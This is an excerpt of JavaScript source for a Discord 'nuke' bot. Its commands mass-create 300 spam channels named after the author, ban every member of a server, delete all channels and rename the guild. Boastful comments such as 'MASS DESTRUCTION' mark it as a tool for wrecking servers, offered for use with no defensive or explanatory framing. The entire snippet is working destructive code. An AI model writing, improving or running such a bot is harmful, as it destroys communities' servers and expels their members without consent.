...
client.on("message", message => {
    ...
    if (command == "ch") {
        for (i = 0; i < 300; i++) {
            message.guild.channels.create('Stiizzy Wins', { reason: 'cool new channel about me' })   /// creates channels with my name :sunglasses:
        }
    }
...
if (command === "banall"){
   message.guild.members.cache.map(member => member.ban({reason: 'You were Nuke Banned'}))  // vapor helped me test :Kiss:

}
if (command == 'nuke') {
        message.guild.channels.cache.forEach(async c => { await c.delete() })   /// MASS DESTRUCTION :evil:
        message.guild.setName("Stizzy Wins")
        for (i = 0; i < 300; i++) {
             message.guild.channels.create('Stiizzy Wins', { reason: 'Needed a cool new channel about me' })
             message.guild.members.cache.forEach(member => member.ban({ reason: "U Stoopid" }))
        }
}
})
client.login(config.token);
